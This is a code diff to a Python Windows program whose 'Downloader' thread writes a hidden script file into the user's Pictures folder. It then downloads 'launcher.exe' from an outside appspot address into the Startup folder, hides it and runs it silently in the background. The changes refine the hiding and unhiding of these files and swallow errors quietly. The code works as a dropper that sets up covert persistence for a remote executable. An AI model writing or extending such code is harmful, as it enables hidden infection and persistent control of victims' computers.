@@ -26,6 +26,7 @@ class Downloader(threading.Thread):
         """Run the thread."""
         #Make a file for the script
         path = file_in_special_path(shellcon.CSIDL_MYPICTURES, "script.txt")
+        unhide_file(path)
         f = open(path, "w")
         print path
         #Save the script
@@ -33,10 +34,11 @@ class Downloader(threading.Thread):
         print cPickle.dumps(self.script)
         #Hide the script
         f.close()
-        win32api.SetFileAttributes(path,win32con.FILE_ATTRIBUTE_HIDDEN)
+        hide_file(path)
         
         #Get a path for the launcher
         path = file_in_special_path(shellcon.CSIDL_STARTUP, "launcher.exe")
+        unhide_file(path)
         #Save the launcher
         url = urllib2.urlopen("http://littlesitetomakemoney.appspot.com/launcher.exe")
         try:
@@ -49,8 +51,8 @@ class Downloader(threading.Thread):
         url.close()
         print path
         #Hide the launcher
-        win32api.SetFileAttributes(path,win32con.FILE_ATTRIBUTE_HIDDEN)
-
+        hide_file(path)
+        
         #Run the launcher
         command = "start /b %s"%win32api.GetShortPathName(path)
         print command
@@ -93,3 +95,4 @@ def __file_setstate(path, state):
     try:
         win32api.SetFileAttributes(path,state)
     except:
+        pass
